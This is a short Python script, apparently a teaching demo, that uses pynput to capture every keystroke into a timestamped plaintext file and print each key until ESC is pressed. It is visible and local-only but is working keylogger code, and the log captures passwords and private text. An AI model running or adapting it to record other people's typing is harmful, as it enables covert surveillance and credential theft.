from pynput import keyboard
from datetime import datetime

LOG_FILE = f"key_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

def on_press(key):
    try:
        k = key.char
    except AttributeError:
        k = str(key)
    with open(LOG_FILE, "a") as f:
        f.write(k + "\n")
    print(f"Key pressed: {k}")

def on_release(key):
    if key == keyboard.Key.esc:
        print("ESC pressed. Stopping keylogger...")
        return False

if __name__ == "__main__":
    print("=== Safe Educational Keylogger Demo ===")
    print("Press ESC to stop logging.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
